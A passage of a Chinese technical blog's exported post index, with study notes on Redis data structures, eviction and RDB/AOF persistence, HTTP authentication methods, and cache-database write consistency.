在对事件队列中的事件进行处理时，会调用相应的处理函数，这就实现了基于事件的回调。因为 Redis 一直在对事件队列进行处理，所以能及时响应客户端请求，提升 Redis 的响应性能。\n\n### 5.2 时间事件\n\n- 定时事件：让一段程序在指定的时间之后执行一次。\n- 周期性事件：让一段程序每隔指定时间就执行一次。\n\n服务器所有的时间事件都放在一个无序链表中，每当时间事件执行器运行时，它就遍历整个链表，查找所有已到达的时间事件，并调用相应的事件处理器。正常模式下的Redis服务器只使用serverCron一个时间事件，而在benchmark模式下，服务器也只使用两个时间事件，所以不影响事件执行的性能。\n\n它的主要工作包括：\n\n- 更新服务器的统计信息(时间、内存占用、数据库占用)\n- 清理数据库的过期键值对\n- AOF、RDB持久化\n- 如果是主从服务器，对从服务器进行定期同步\n- 如果是集群模式，对进群进行定期同步和连接\n\n# 6. 头脑风暴\n\n+ redis事务有命令和lua模式，原子是全部执行或全部不执行，并不一定保证成功。\n+ 多线程只是处理网络请求，redis读写还是单线程。\n+ 文件事件是用epoll监听文件描述符。时间事件是做持久化，清除key，主从同步等。\n\n# 7. 参考资料\n\n+ https://github.com/ZhongFuCheng3y/3y#tvredis\n+ https://www.pdai.tech/md/db/nosql-redis/db-redis-x-trans.html\n\n","tags":["redis"],"categories":["redis"]},{"title":"redis数据结构和持久化","url":"%2Fp%2F2a86dce.html","content":"\n# 1. 基础对象\n\nRedis的存储是以`key-value`的形式的。Redis中的key一定是字符串，value可以是string、list、hash、set、sortset这几种常用的。\n\n| 类型    | 作用                                               | 底层数据结构          |\n| ------- | -------------------------------------------------- | --------------------- |\n| string  | 简单的key-value                                    | int, embstr(sds), raw |\n| list    | 有序列表,可做简单队列                              | 压缩列表,双向链表     |\n| hash    | 哈希表, 存储结构化数据                             | 压缩列表,哈希 table   |\n| set     | 无序列表(去重), 提供一系列的交集、并集、差集的命令 | 整数集合,哈希 table   |\n| sortset | 有序集合映射, 排行榜                               | 压缩列表, 跳跃表      |\n\n<!-- more -->\n\n### 1.1 string\n\n+ int 编码：保存的是可以用 long 类型表示的整数值。\n\n+ embstr 编码：保存长度小于44字节的字符串（redis3.2版本之前是39字节，之后是44字节）。\n\n+ raw 编码：保存长度大于44字节的字符串（redis3.2版本之前是39字节，之后是44字节）\n\n**使用场景**\n\n- 缓存： 经典使用场景，把常用信息，字符串，图片或者视频等信息放到redis中，redis作为缓存层，mysql做持久化层，降低mysql的读写压力。\n- 计数器：redis是单线程模型，一个命令执行完才会执行下一个，同时数据可以一步落地到其他的数据源。\n- session：常见方案spring session + redis实现session共享，\n\n\n\n### 1.2 list\n\n列表对象的编码可以是 ziplist 或者 linkedlist。新版本列表对象的编码是quicklist。 \n\n**使用技巧**\n\nlpush+lpop=Stack(栈)\n\nlpush+rpop=Queue（队列）\n\nlpush+ltrim=Capped Collection（有限集合）\n\nlpush+brpop=Message Queue（消息队列）\n\n**使用场景**\n\n- 微博TimeLine: 有人发布微博，用lpush加入时间轴，展示新的列表信息。\n- 消息队列\n\n### 1.3 hash\n\n- ziplist：key和value的字符串长度都小于64字节`&&`键值对总数量小于512\n- hashtable：key和value的字符串长度大于64字节`||`键值对总数量大于512\n\n**使用场景**\n\n- 缓存： 直观，相比string更节省空间，的维护缓存信息，如用户信息，视频信息等。\n\n### 1.4 set\n\n- intset：保存的元素全都是整数`&&`总数量小于512\n- hashtable：保存的元素不是整数`||`总数量大于512\n\n**使用场景**\n\n- 标签（tag），给用户添加标签，或者用户给消息添加标签，这样有同一标签或者类似标签的可以给推荐关注的事或者关注的人。\n- 点赞，或点踩，收藏等，可以放到set中实现\n\n### 1.5 zset\n\n- ziplist：元素长度小于64`&&`总数量小于128\n- skiplist：元素长度大于64`||`总数量大于128\n\nskiplist能够达到插入的时间复杂度为O(logn)，根据成员查分值的时间复杂度为O(1)\n\n**使用场景**\n\n+ 排行榜：有序集合经典使用场景。例如小说视频等网站需要对用户上传的小说视频做排行榜，榜单可以按照用户关注数，更新时间，字数等打分，做排行。\n\n# 2.底层数据结构\n\n<img src=\"redis数据结构和持久化/image-20230831144857220.png\" alt=\"image-20230831144857220\" style=\"zoom:50%;\" />\n\n### 2.1 简单动态字符串 - SDS\n\n- 常数复杂度获取字符串长度\n\n  由于 len 属性的存在，我们获取 SDS 字符串的长度只需要读取 len 属性，时间复杂度为 O(1)。\n\n- 杜绝缓冲区溢出\n\n- 减少修改字符串的内存重新分配次数\n\n  由于len属性和alloc属性的存在，对于修改字符串SDS实现了空间预分配和惰性空间释放两种策略。\n\n+ 二进制安全\n+ 兼容部分 C 字符串函数\n\n### 2.2 压缩列表 - ZipList\n\nZiplist 是内存紧凑型列表，节省内存空间、提升内存使用率。适用列表数量较少，元素size较小的场景。\n\n1. 连续存储：Ziplist中的元素是连续存储的，不像普通的双向链表那样使用指针进行连接。这样可以减少指针的使用，从而节省内存。\n\n2. 紧凑存储：Ziplist通过使用紧凑的存储格式，可以节省内存空间。它将不同长度的字符串和整数存储在一起，使用特定的编码方式进行压缩，从而减少了存储空间的占用。\n\n3. 快速访问：由于Ziplist使用连续存储，可以通过偏移量（offset）快速访问到指定位置的元素，而无需像普通链表那样遍历。\n\n   \n\n### 2.3 快表 - QuickList\n\nquicklist这个结构是Redis在3.2版本后新加的, 之前的版本是list(即linkedlist)， 用于String数据类型中。\n\n它是一种以ziplist为结点的双端链表结构. 宏观上, quicklist是一个链表, 微观上, 链表中的每个结点都是一个ziplist。\n\n### 2.4 字典/哈希表 - Dict\n\n**1. 解决哈希冲突**\n\n  链地址法。通过字典里面的 *next 指针指向下一个具有相同索引值的哈希表节点。\n\n**2. 扩容和收缩**\n\n  当哈希表保存的键值对太多或者太少时，就要通过 rerehash(重新散列）来对哈希表进行相应的扩展或者收缩。具体步骤：\n\n1、如果执行扩展操作，会基于原哈希表创建一个大小等于 ht[0].used*2n 的哈希表（也就是每次扩展都是根据原哈希表已使用的空间扩大一倍创建另一个哈希表）。相反如果执行的是收缩操作，每次收缩是根据已使用空间缩小一倍创建一个新的哈希表。\n\n2、重新利用上面的哈希算法，计算索引值，然后将键值对放到新的哈希表位置上。\n\n3、所有键值对都迁徙完毕后，释放原哈希表的内存空间。\n\n**3. 触发扩容的条件**\n\n1、服务器目前没有执行 BGSAVE 命令或者 BGREWRITEAOF 命令，并且负载因子大于等于1。\n\n2、服务器目前正在执行 BGSAVE 命令或者 BGREWRITEAOF 命令，并且负载因子大于等于5。\n\nps：负载因子 = 哈希表已保存节点数量 / 哈希表大小。\n\n**4. 渐近式 rehash**\n\n什么叫渐进式 rehash？也就是说扩容和收缩操作不是一次性、集中式完成的，而是分多次、渐进式完成的。如果保存在Redis中的键值对只有几个几十个，那么 rehash 操作可以瞬间完成，但是如果键值对有几百万，几千万甚至几亿，那么要一次性的进行 rehash，势必会造成Redis一段时间内不能进行别的操作。\n\n所以Redis采用渐进式 rehash，这样在进行渐进式rehash期间，字典的删除查找更新等操作可能会在两个哈希表上进行，第一个哈希表没有找到，就会去第二个哈希表上进行查找。但是进行增加操作，一定是在新的哈希表上进行的。\n\n### 2.5 整数集 - IntSet\n\n整数集合（intset）是集合类型的底层实现之一，当一个集合只包含整数值元素，并且这个集合的元素数量不多时，Redis 就会使用整数集合作为集合键的底层实现。\n\n### 2.6 跳表 - ZSkipList\n\n1. 跳跃表是一种平衡的数据结构：与平衡二叉搜索树相比，跳跃表的插入、删除和查找操作的平均时间复杂度都是O(log n)，其中n是元素的数量。\n1. 跳跃表是一种有序数据结构：跳跃表中的元素是有序排列的，使得查找操作可以通过跳跃的方式快速定位到目标元素。\n1. 跳跃表通过多级索引实现快速查找：跳跃表中的每一层都是原始链表的一个子集，每一级索引的元素数量逐渐减少。通过在不同级别之间跳跃，可以快速定位到目标元素。\n1. 跳跃表支持高效的插入和删除操作：相比平衡二叉搜索树，跳跃表的插入和删除操作更加简单高效，不需要进行平衡操作，只需要更新索引层的指针即可。\n1. 跳跃表相对简单易实现：相比其他平衡数据结构如红黑树等，跳跃表的实现相对简单，容易理解和实现。\n1. 跳跃表相对于其他数据结构，可能会占用更多的内存空间来存储额外的索引层。\n\n<img src=\"redis数据结构和持久化/image-20230831151230763.png\" alt=\"image-20230831151230763\" style=\"zoom:43%;\" />\n\n**为什么Redis选择使用跳表而不是红黑树来实现有序集合?**\n\nRedis 中的有序集合(zset) 支持的操作：插入一个元素，删除一个元素，查找一个元素，有序输出所有元素，按照范围区间查找元素（比如查找值在 [100, 356] 之间的数据）。\n\n其中，前四个操作红黑树也可以完成，且时间复杂度跟跳表是一样的。但是，按照区间来查找数据这个操作，红黑树的效率没有跳表高。按照区间查找数据时，跳表可以做到 O(logn) 的时间复杂度定位区间的起点，然后在原始链表中顺序往后遍历就可以了，非常高效。\n\n\n\n# 3. 其他数据对象\n\n### 3.1 HyperLogLogs（基数统计)\n\n比如数据集 {1, 3, 5, 7, 5, 7, 8}， 那么这个数据集的基数集为 {1, 3, 5 ,7, 8}, 基数(不重复元素)为5。 基数估计就是在误差可接受的范围内，快速计算基数。\n\n```bash\n127.0.0.1:6379> pfadd key1 a b c d e f g h i\t# 创建第一组元素\n(integer) 1\n127.0.0.1:6379> pfcount key1\t\t\t\t\t# 统计元素的基数数量\n(integer) 9\n127.0.0.1:6379> pfadd key2 c j k l m e g a\t\t# 创建第二组元素\n(integer) 1\n127.0.0.1:6379> pfcount key2\n(integer) 8\n127.0.0.1:6379> pfmerge key3 key1 key2\t\t\t# 合并两组：key1 key2 -> key3 并集\nOK\n127.0.0.1:6379> pfcount key3\n(integer) 13\n```\n\nHyperLogLog只能统计基数的大小（也就是数据集的大小，集合的个数），他不能存储元素的本身，不能向set集合那样存储元素本身，也就是说无法返回元素。\n\n### 3.2 Bitmap （位存储）\n\nBitmap 即位图数据结构，都是操作二进制位来进行记录，只有0 和 1 两个状态。\n\n**两个状态的，都可以使用 Bitmaps**！如果存储一年的打卡状态需要多少内存呢？ 365 天 = 365 bit 1字节 = 8bit 46 个字节左右！\n\n```bash\n127.0.0.1:6379> setbit sign 0 1\n(integer) 0\n127.0.0.1:6379> setbit sign 1 1\n(integer) 0\n127.0.0.1:6379> setbit sign 2 0\n(integer) 0\n127.0.0.1:6379> setbit sign 3 1\n(integer) 0\n127.0.0.1:6379> setbit sign 4 0\n(integer) 0\n127.0.0.1:6379> setbit sign 5 0\n(integer) 0\n127.0.0.1:6379> setbit sign 6 1\n(integer) 0\n\n\n127.0.0.1:6379> bitcount sign # 统计这周的打卡记录，就可以看到是否有全勤！\n(integer) 4\n```\n\n\n\n### 3.3 geospatial (地理位置)\n\ngeo底层的实现原理实际上就是Zset。\n\nRedis 的 Geo 在 Redis 3.2 版本就推出了! 这个功能可以推算地理位置的信息: 两地之间的距离, 方圆几里的人。\n\n```bash\n# 添加地理位置\n127.0.0.1:6379> geoadd china:city 118.76 32.04 manjing 112.55 37.86 taiyuan 123.43 41.80 shenyang\n(integer) 3\n127.0.0.1:6379> geoadd china:city 144.05 22.52 shengzhen 120.16 30.24 hangzhou 108.96 34.26 xian\n(integer) 3\n\n\n# 获取指定的成员的经度和纬度\n127.0.0.1:6379> geopos china:city taiyuan manjing\n1) 1) \"112.54999905824661255\"\n   1) \"37.86000073876942196\"\n2) 1) \"118.75999957323074341\"\n   1) \"32.03999960287850968\"\n\n# 获得所有附近的人的地址, 定位, 通过半径来查询， 以 100,30 这个坐标为中心, 寻找半径为1000km的城市\n127.0.0.1:6379> georadius china:city 110 30 1000 km\t\t\t\n1) \"xian\"\n2) \"hangzhou\"\n3) \"manjing\"\n4) \"taiyuan\"\n\n127.0.0.1:6379> georadius china:city 110 30 500 km\n1) \"xian\"\n127.0.0.1:6379> georadius china:city 110 30 500 km withdist\n1) 1) \"xian\"\n   2) \"483.8340\"\n127.0.0.1:6379> georadius china:city 110 30 1000 km withcoord withdist count 2\n1) 1) \"xian\"\n   2) \"483.8340\"\n   3) 1) \"108.96000176668167114\"\n      2) \"34.25999964418929977\"\n2) 1) \"manjing\"\n   2) \"864.9816\"\n   3) 1) \"118.75999957323074341\"\n      2) \"32.03999960287850968\"\n\n```\n\n### 3.4 Stream\n\nRedis5.0 中还增加了一个数据结构Stream，从字面上看是流类型，但其实从功能上看，应该是Redis对消息队列（MQ，Message Queue）的完善实现。\n\n用过Redis做消息队列的都了解，基于Reids的消息队列实现有很多种，例如：\n\n- PUB/SUB，订阅/发布模式 : 但是发布订阅模式是无法持久化的，如果出现网络断开、Redis 宕机等，消息就会被丢弃；\n- 基于List LPUSH+BRPOP 或者 基于Sorted-Set的实现 ，支持了持久化，但是不支持多播，分组消费等。\n\n\n\n# 4. 过期删除策略和内存淘汰机制\n\n### 4.1 过期删除策略(3种)\n\n- 定时删除(对内存友好，对CPU不友好)\n\n  到时间点上就把所有过期的键删除了。\n\n- 惰性删除(对CPU极度友好，对内存极度不友好)\n\n  每次从键空间取键的时候，判断一下该键是否过期了，如果过期了就删除。\n\n- 定期删除(折中)\n\n  每隔一段时间去删除过期键，限制删除的执行时长和频率。\n\n第一种和第三种为主动删除策略，而第二种则为被动删除策略。Redis采用的是**惰性删除+定期删除**两种策略，所以说，在Redis里边如果过期键到了过期的时间了，未必被立马删除的！\n\n### 4.2 内存淘汰机制(8种)\n\n当 Redis 运行内存已经超过 Redis 设置的最大内存之后，将采用什么策略来删除符合条件的键值对，以此来保障 Redis 高效的运行。\n\n早期版本的 Redis 有以下 6 种淘汰策略：\n\n1. **noeviction**：不淘汰任何数据，当内存不足时，新增操作会报错，Redis 默认内存淘汰策略；\n2. **allkeys-lru**：淘汰整个键值中最久未使用的键值；\n3. **allkeys-random**：随机淘汰任意键值;\n4. **volatile-lru**：淘汰所有设置了过期时间的键值中最久未使用的键值；\n5. **volatile-random**：随机淘汰设置了过期时间的任意键值；\n6. **volatile-ttl**：优先淘汰更早过期的键值。\n\n在 Redis 4.0 版本中又新增了 2 种淘汰策略：\n\n1. **volatile-lfu**：淘汰所有设置了过期时间的键值中，最少使用的键值；\n2. **allkeys-lfu**：淘汰整个键值中最少使用的键值。\n\n其中 allkeys-xxx 表示从所有的键值中淘汰数据，而 volatile-xxx 表示从设置了过期键的键值中淘汰数据。\n\nRedis3.0之后，默认的内存淘汰策略是noeviction。\n\n### 4.3 内存淘汰算法\n\n##### LRU 算法\n\nLRU 全称是 Least Recently Used 译为最近最少使用，是一种常用的页面置换算法，选择最近最久未使用的页面予以淘汰。\n\nLRU 算法需要基于链表结构，链表中的元素按照操作顺序从前往后排列，最新操作的键会被移动到表头，当需要内存淘汰时，只需要删除链表尾部的元素即可。\n\nLRU 算法有一个缺点，比如说很久没有使用的一个键值，如果最近被访问了一次，那么它就不会被淘汰，即使它是使用次数最少的缓存，那它也不会被淘汰，因此在 Redis 4.0 之后引入了 LFU 算法。\n\n##### LFU 算法\n\nLFU 全称是 Least Frequently Used 翻译为最不常用的，最不常用的算法是根据总访问次数来淘汰数据的，它的核心思想是“如果数据过去被访问多次，那么将来被访问的频率也更高”。\n\nLFU 解决了偶尔被访问一次之后，数据就不会被淘汰的问题，相比于 LRU 算法也更合理一些。\n\n# 5. Redis 持久化\n\n### 5.1 RDB(二进制快照)\n\nRDB 就是 Redis DataBase 的缩写，中文名为快照/内存快照，RDB持久化是把当前进程数据生成快照保存到磁盘上的过程，由于是某一时刻的快照，那么快照中的值要早于或者等于内存中的值。\n\n##### 手动触发\n\n+ save命令：阻塞当前Redis服务器，直到RDB过程完成为止，对于内存 比较大的实例会造成长时间阻塞，线上环境不建议使用\n\n+ bgsave命令：Redis进程执行fork操作创建子进程，RDB持久化过程由子 进程负责，完成后自动结束。阻塞只发生在fork阶段，一般时间很短\n\n<img src=\"redis数据结构和持久化/image-20230830155731890.png\" alt=\"image-20230830155731890\" style=\"zoom:50%;\" />\n\n##### 自动触发\n\n- redis.conf中配置`save m n`，即在m秒内有n次修改时，自动触发bgsave生成rdb文件；\n- 主从复制时，从节点要从主节点进行全量复制时也会触发bgsave操作，生成当时的快照发送到从节点；\n- 执行debug reload命令重新加载redis时也会触发bgsave操作；\n- 默认情况下执行shutdown命令时，如果没有开启aof持久化，那么也会触发bgsave操作；\n\n\n\n```shell\n# 默认的设置为：\nsave 900 1              #在900秒(15分钟)之后，至少有1个key发生变化，\nsave 300 10             #在300秒(5分钟)之后，至少有10个key发生变化\nsave 60 10000       \t  #在60秒(1分钟)之后，至少有10000个key发生变化\n```\n\n\n\n##### 快照数据一致性\n\n将内存中的数据同步到硬盘的过程可能就会持续比较长的时间，而实际情况是这段时间Redis服务一般都会收到数据写操作请求。那么如何保证数据一致性呢？RDB中的核心思路是Copy-on-Write。\n\n<img src=\"redis数据结构和持久化/image-20230830160712880.png\" alt=\"image-20230830160712880\" style=\"zoom:50%;\" />\n\n如果主线程对这些数据也都是读操作（例如图中的键值对 A），那么，主线程和 bgsave 子进程相互不影响。但是，如果主线程要修改一块数据（例如图中的键值对 C），那么，这块数据就会被复制一份，生成该数据的副本。然后，bgsave 子进程会把这个副本数据写入 RDB 文件，而在这个过程中，主线程仍然可以直接修改原来的数据。\n\n##### 可以每秒做一次快照吗\n\n这种想法其实是错误的。虽然 bgsave 执行时不阻塞主线程，但是如果频繁地执行全量快照，也会带来两方面的开销：\n\n- 一方面，频繁将全量数据写入磁盘，会给磁盘带来很大压力，多个快照竞争有限的磁盘带宽，前一个快照还没有做完，后一个又开始做了，容易造成恶性循环。\n- 另一方面，bgsave 子进程需要通过 fork 操作从主线程创建出来。虽然，子进程在创建后不会再阻塞主线程，但是，fork 这个创建过程本身会阻塞主线程，而且主线程的内存越大，阻塞时间越长。如果频繁 fork 出 bgsave 子进程，这就会频繁阻塞主线程了。\n\n##### RDB的优缺点\n\n- **优点**\n  - RDB文件是某个时间节点的快照，默认使用LZF算法进行压缩，压缩后的文件体积远远小于内存大小，适用于备份、全量复制等场景；\n  - Redis加载RDB文件恢复数据要远远快于AOF方式；\n- **缺点**\n  - RDB方式实时性不够，无法做到秒级的持久化；\n  - 每次调用bgsave都需要fork子进程，fork子进程属于重量级操作，频繁执行成本较高；\n  - RDB文件是二进制的，没有可读性，AOF文件在了解其结构的情况下可以手动修改或者补全；\n  - 版本兼容RDB文件问题；\n\n针对RDB不适合实时持久化的问题，Redis提供了AOF持久化方式来解决。\n\n### 5.2 AOF （命令追加）\n\nRedis是“写后”日志，Redis先执行命令，把数据写入内存，然后才记录日志。AOF日志记录Redis的每个写命令，步骤分为：命令追加（append）、文件写入（write）和文件同步（sync）。\n\n##### 命令追加\n\n当AOF持久化功能打开了，服务器在执行完一个写命令之后，会以协议格式将被执行的写命令追加到服务器的 aof_buf 缓冲区。\n\n##### 文件写入和文件同步\n\n关于何时将 aof_buf 缓冲区的内容写入AOF文件中，Redis提供了三种写回策略：\n\n<img src=\"redis数据结构和持久化/image-20230830161413607.png\" alt=\"image-20230830161413607\" style=\"zoom:50%;\" />\n\n\n```shell\nappendfsync always     # 每次有数据修改发生时都会写入AOF文件。\nappendfsync everysec   # 每秒钟同步一次，该策略为AOF的默认策略。\nappendfsync no         # 每个写命令执行完，只是先把日志写到AOF文件的内存缓冲区，由操作系统决定何时将缓冲区内容写回磁盘。\n```\n\n##### AOF配置\n\n默认情况下，Redis是没有开启AOF的，可以通过配置redis.conf文件来开启AOF持久化。\n\n```bash\n# appendonly参数开启AOF持久化\nappendonly no\n\n# AOF持久化的文件名，默认是appendonly.aof\nappendfilename \"appendonly.aof\"\n\n# AOF文件的保存位置和RDB文件的位置相同，都是通过dir参数设置的\ndir ./\n\n# 同步策略\n# appendfsync always\nappendfsync everysec\n# appendfsync no\n\n# aof重写期间是否同步\nno-appendfsync-on-rewrite no\n\n# 重写触发配置\nauto-aof-rewrite-percentage 100  #意思就是如果AOF文件的大小超过上次AOF文件重写后的1倍，就启动重写操作。\nauto-aof-rewrite-min-size 64mb  #如果AOF文件大小低于这个值，则不会触发重写操作\n\n# 加载aof出错如何处理\naof-load-truncated yes\n\n# 文件重写策略\naof-rewrite-incremental-fsync yes\n```\n\n\n\n##### AOF重写\n\nRedis长时间运行，命令不断写入AOF，文件会越来越大，不加控制可能影响宿主机的安全。为了解决AOF文件体积问题，Redis引入了AOF文件重写功能，它会根据Redis内数据对象的最新状态生成新的AOF文件，新旧文件对应的数据状态一致。\n\nRedis通过创建一个新的AOF文件来替换现有的AOF，新旧两个AOF文件保存的数据相同，但新AOF文件没有了冗余命令。（优雅！）\n\n<img src=\"redis数据结构和持久化/image-20230830162217305.png\" alt=\"image-20230830162217305\" style=\"zoom:50%;\" />\n\nAOF文件太大时会触发AOF文件重写，那到底是多大呢？有哪些情况会触发重写操作呢？\n\n- auto-aof-rewrite-percentage：代表当前AOF文件大小（aof_current_size）和上一次重写后AOF文件大小（aof_base_size）相比，增长的比例。\n- auto-aof-rewrite-min-size：表示运行`BGREWRITEAOF`时AOF文件占用空间最小值，默认为64MB；\n\n\n\n### 5.3 RDB和AOF混合方式\n\nRedis 4.0 中提出了一个混合使用 AOF 日志和内存快照的方法。简单来说，内存快照以一定的频率执行，在两次快照之间，使用 AOF 日志记录这期间的所有命令操作。\n\n这样一来，快照不用很频繁地执行，这就避免了频繁 fork 对主线程的影响。而且，AOF 日志也只用记录两次快照间的操作，也就是说，不需要记录所有操作了，因此，就不会出现文件过大的情况了，也可以避免重写开销。\n\n<img src=\"redis数据结构和持久化/image-20230830162806365.png\" alt=\"image-20230830162806365\" style=\"zoom:50%;\" />\n\nT1 和 T2 时刻的修改，用 AOF 日志记录，等到第二次做全量快照时，就可以清空 AOF 日志，因为此时的修改都已经记录到快照中了，恢复时就不再用日志了。\n\n**配置**\n\n```bash\naof-use-rdb-preamble 的值是：\n\n- no：按照AOF格式写入命令，与4.0前版本无差别；\n- yes：先按照RDB格式写入数据状态，然后把重写期间AOF缓冲区的内容以AOF格式写入，文件前半部分为RDB格式，后半部分为AOF格式。\n```\n\n在AOF方式下，**开启混合持久化机制生成的文件是“RDB头+AOF尾”，未开启时生成的文件全部为AOF格式。**考虑两种文件格式的兼容性，如果Redis发现AOF文件为RDB头，会使用RDB数据加载的方法读取并恢复前半部分；然后再使用AOF方式读取并恢复后半部分。由于AOF格式存储的数据为RESP协议命令，Redis采用伪客户端执行命令的方式来恢复数据。\n\n# 6. 头脑风暴\n\n+ 删除机制：定期+惰性删除机制。淘汰机制：不淘汰+过期key的淘汰+所有key的淘汰，组合。LRU和LFU算法机制。\n+ rdb是二进制文件就，save和bgsave触发或者配置文件自动触发。AOF是命令追加到缓冲区。4.0后可以混合RDB头+AOF尾。\n\n# 7. 参考资料\n\n+ https://github.com/ZhongFuCheng3y/3y#tvredis\n+ https://pdai.tech/md/db/nosql-redis/db-redis-x-rdb-aof.html\n+ https://segmentfault.com/a/1190000039208726\n+ https://www.pdai.tech/md/db/nosql-redis/db-redis-x-redis-ds.html\n+ https://www.jianshu.com/p/9d8296562806\n\n","tags":["redis"],"categories":["redis"]},{"title":"http常见的认证方式","url":"%2Fp%2Fb6a04976.html","content":"\n# 1. http basic认证\n\nHttpBasic认证是Http自带的认证方式，这种认证方式通常表现为浏览器弹出Alert窗口提示输入用户名/密码。\n\n<!-- more -->\n\n其交互过程如下：\n\n1. 开始时，客户端发送未携带身份信息的请求。\n2. 服务端返回 401 Unauthorized 状态，并在返回头中说明要用 `Basic` 方法进行认证： `WWW-Authenticate: Basic`。\n3. 客户端重新发送请求，并将身份信息包含在请求头中: `Authorization: Basic aHk6bXlwYXNzd29yZA==`。\n4. 服务端验证请求头中的身份信息，并相应返回 200 OK 或 403 Forbidden 状态。\n5. 之后，客户端每次发送请求都在请求头中携带该身份信息。\n\n<img src=\"http%E5%B8%B8%E8%A7%81%E7%9A%84%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F/image-20220328164243552.png\" alt=\"image-20220328164243552\" style=\"zoom:50%;\" />\n\n\n\n其中传送的身份信息是 `<username>:<password>` 经 base64 编码后的字串。如本例中的 `aHk6bXlwYXNzd29yZA==`， 经 base64 解码后为 `hy:mypassword`。\n\n这种认证方法的优点是简单，容易理解。\n\n缺点有：\n\n- 不安全：认证身份信息用明文传送，因此需结合 https 使用。\n- 效率低：服务端处理请求时，每次都需要验证身份信息，如用户名和密码。\n\n### 1.1 http digest认证\n\nHttpBasic认证很少在可公开访问的互联网网站上使用，有时候会在小的私有系统中使用（如路由器网页管理接口）。\n\ndigest认证是另一种HTTP认证协议，它试图修复基本认证协议的严重缺陷。具体来说，摘要认证进行了如下改进：永远不会以明文方式在网络上发送密码；可以防止恶意用户捕获并重放认证的握手过程；可以有选择地防止对报文内容的篡改；防范其他几种常见的攻击方式\n\n需要注意的是，digest认证除了能够保护密码之外，并不能保护其他内容。使用传输层安全(Transport Layer Security, TLS)和安全HTTP(HTTPS)协议更为合适一些。所以迄今为止，摘要认证还没有被广泛应用。\n\n\n\n# 2. session认证\n\n这种认证方法结合了 Session 和 Cookie。服务端将本次会话信息以 Session 对象的形式保存在服务端的内存、数据库或文件系统中，并将对应的 Session 对象 ID 值 SessionID 以 Cookie 形式返回给客户端，SessionID 保存在客户端的 Cookie 中。\n\n这是有状态的认证方法：服务端保存 Session 对象，客户端以 Cookie 形式保存 SessionID。\n\n\n\n其交互过程如下：\n\n1. 客户端在登录页面输入身份信息，如用户名/密码。\n2. 服务端验证身份信息，通过后生成一个 Session 对象，保存到服务端，并将 SessionID 值以 Cookie 形式返回给客户端。\n3. 客户端将接收到的 SessionID 保存到 Cookie 中，并且之后每次请求都在请求头中携带 SessionID Cookie。\n4. 服务端从请求的 Cookie 中获取 SessionID，并查询其对应的 Session 对象，从而获得身份信息。\n5. 客户端退出本次会话后，客户端删除 SessionID 的 Cookie，服务端删除 Session 对象。\n6. 如果客户端之后要重新登录，需重新生成 Session 对象和 SessionID。\n\n优点：\n\n- 较安全：客户端每次请求时无需发送身份信息，只需发送 SessionID。\n- 较高效：服务端无需每次处理请求时都要验证身份信息，只需通过 SessionID 查询 Session 对象。\n\n缺点：\n\n- 扩展性差，Session 对象保存在服务端，如果是保存在多个服务器上，有一致性问题，如果保存在单个服务器上，无法适应用户增长。\n- 基于 Cookie 的 SessionID 不能跨域共享，同一用户的多个客户端（如浏览器客户端和 APP）不能共享 SessionId。\n- 基于 Cookie 的 SessionID 易被截获生成 CSRF 攻击。\n\n\n\n# 3. token 认证\n\n这是一种 SPA 应用和 APP 经常使用的认证方法。它是一种无状态的认证方法。\n\n客户端首先将用户信息发送给服务端，服务端根据用户信息+私钥生成一个唯一的 Token 并返回给客户端。Token 只保存在客户端，之后客户端的每个请求头中都携带 Token，而服务端只通过运算（无需查询）来验证用户。\n\n<img src=\"http%E5%B8%B8%E8%A7%81%E7%9A%84%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F/image-20220328164300837.png\" alt=\"image-20220328164300837\" style=\"zoom:50%;\" />\n\n\n\n优点：\n\n- Token 只保存在客户端，因此不影响服务端扩展性。\n- 为用户生成的 Token 可以在多个客户端共用。\n\n缺点：\n\n- Token 包含了用户的全部信息，不只是如 SessionID 类似的一个 ID 值，因此会增加每次请求包的大小。\n\n目前使用较多的是基于JWT(JSON Web Tokens) 的 Token 认证法。\n\n\n\n# 4. 参考资料\n\n+ https://www.liuvv.com/p/2a7234ed.html\n+ https://www.liuvv.com/p/312a7a36.html\n+ https://www.liuvv.com/p/722ed7e7.html\n","tags":["http"],"categories":["http"]},{"title":"缓存更新和数据双写一致问题","url":"%2Fp%2F724671b1.html","content":"\n# 1.  Cache-Aside\n\n旁路缓存模式，它的提出是为了尽可能地解决缓存与数据库的数据不一致问题。\n\n<!-- more -->\n\n### 1.1 读请求\n\n<img src=\"缓存更新和数据双写一致问题/1.webp\" alt=\"Cache-Aside读请求\" style=\"zoom: 50%;\" />\n\n1. 读的时候，先读缓存，缓存命中的话，直接返回数据\n2. 缓存没有命中的话，就去读数据库，从数据库取出数据，放入缓存后，同时返回响应。\n\n\n\n### 1.2 写请求\n\n<img src=\"缓存更新和数据双写一致问题/2.webp\" alt=\"Cache-Aside写请求\" style=\"zoom: 67%;\" />\n\n\n\n写的的时候，先更新数据库，然后再删除缓存。\n\n# 2. 删除 or 更新缓存\n\n为什么是删除缓存而不是更新缓存呢？\n\n<img src=\"缓存更新和数据双写一致问题/7.webp\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n1. 线程A先发起一个写操作，第一步先更新数据库\n2. 线程B再发起一个写操作，第二步更新了数据库\n3. 由于网络等原因，线程B先更新了缓存\n4. 线程A更新缓存。\n\n这时候，缓存保存的是A的数据（老数据），数据库保存的是B的数据（新数据），数据不一致了，脏数据出现啦。如果是删除缓存取代更新缓存则不会出现这个脏数据问题。\n\n> 更新缓存相对于删除缓存还有两点劣势：\n\n- 如果你写入的缓存值，是经过复杂计算才得到的话。更新缓存频率高的话，就浪费性能啦。\n- 在写数据库场景多，读数据场景少的情况下，数据很多时候还没被读取到，又被更新了，这也浪费了性能呢(实际上，写多的场景，用缓存也不是很划算了)\n\n# 3. 先缓存 or 先数据库\n\n无论先操作db还是cache，都会有各自的问题，根本原因是cache和db的更新不是一个原子操作，因此总会有不一致的问题。\n\n### 3.1 先删缓存，再更新数据库\n\n+ 如果删除了缓存Redis，还没有来得及写库MySQL，另一个线程就来读取，发现缓存为空，则去数据库中读取数据写入缓存，此时缓存中为脏数据。\n\n### 3.2 先更新数据库，再删缓存(✓)\n\n+ 如果先写了库，在删除缓存前，写库的线程宕机了，没有删除掉缓存，则也会出现数据不一致情况。\n\n+ 一个是读操作，但是没有命中缓存，然后就到数据库中取数据，此时来了一个写操作，写完数据库后，让缓存失效，然后，之前的那个读操作再把老的数据放进去，所以，会造成脏数据。\n\n  